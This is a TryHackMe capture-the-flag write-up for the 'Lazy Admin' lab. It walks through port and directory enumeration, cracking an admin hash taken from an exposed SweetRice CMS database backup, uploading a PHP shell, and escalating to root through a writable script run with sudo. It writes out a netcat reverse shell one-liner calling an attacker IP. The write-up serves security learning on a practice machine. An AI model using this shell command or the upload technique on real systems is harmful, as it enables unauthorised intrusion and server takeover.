* * *
 ### LAB: LAZY ADMIN
 ### PLATFORM: TRYHACKME
* * *
![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/78cbe967-4e98-4444-81ab-fd4e7e862bc1)

### ENUMERATION

- Rustscan's result

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d472f88d-eda5-4353-b883-c0175b88dd32)

- Nmap's service identification
  
        ❯ nmap -sC -sV -p 22,80 10.10.55.39
      Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 14:50 EST
      Nmap scan report for 10.10.55.39
      Host is up (0.15s latency).
      
      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
      |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
      |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
      80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: Apache2 Ubuntu Default Page: It works
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
      
- I discovered a directory `content` with ffuf

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7b86d596-d097-4936-9aa4-bb5a67490891)

-  I fuzzed `/content/` with ffuf for more sub-directories

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0dec9cbc-11f5-469c-8bf2-1c78f97233e1)
 
- `/content`'s index page reveals the CMS of the site which is `sweetrice`
    
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4c9ce986-d48e-4e93-bb08-a71672630670)

- Sub directory `as` contains an admin panel

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4a973c83-99eb-4e6d-aeff-acc049e31c13)

- Another subdirectory `content/inc/mysql_backup/` contains an sql database which reveals a password hash and a username

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1c624102-95c0-4b83-8088-28e0b0c542f4)

- I cracked the hash `42f749ade7f9e195bf475f37a44cafcb` with `crackstation.net`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d682ca26-5bd7-48fe-9bd0-a1b9a6e0e339)

- Admin panel accessed

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/850fd2bd-6bf9-43e6-b48f-3e26518b31e9)

### SWEETRICE CMS EXPLOIT

- The Sweetrice cms has an arbitrary file upload vulnerability which allows authenticated admin to upload a file,if an attacker can
get the admin credentials,the attacker can upload arbitrary php code to gain access to the server.<a href="https://www.exploit-db.com/exploits/40716">Exploit</a>

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9cb1ec3e-cc0a-4f8c-9075-175acf49083e)

- To manually, use the exploit,navigate to `ads`, and copy this php system code and save

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0adb62f7-b07d-433b-b408-bab57269c1d8)

- To find the shell,navigate to `</host>/inc/ads/` to find your shell

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6fa78a0b-e4a1-46f2-9ac3-929886378182)

- Shell Access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/37bd12e1-41ac-4df6-afd7-0430a9d12360)

### PRIVILEGE ESCALATION

- After running `sudo -l`,I discovered that user `www-data` can run a script as root and also the script can run a script owned
by root user and we have write permissions for the same script `/etc/copy.sh`.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/703218ab-9d8d-4a4f-a17d-4e5bd79f438b)

- To escalate privileges,we can copy a rev shell code into copy.sh and set up a listener
  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.158.229 1337 >/tmp/f`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ce15b4a0-36ff-4feb-87a1-e855fc4657f0)

- We have a root shell after running `sudo /usr/bin/perl /home/itguy/backup.pl`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f3484f59-c549-4546-8457-20fa1250ac90)
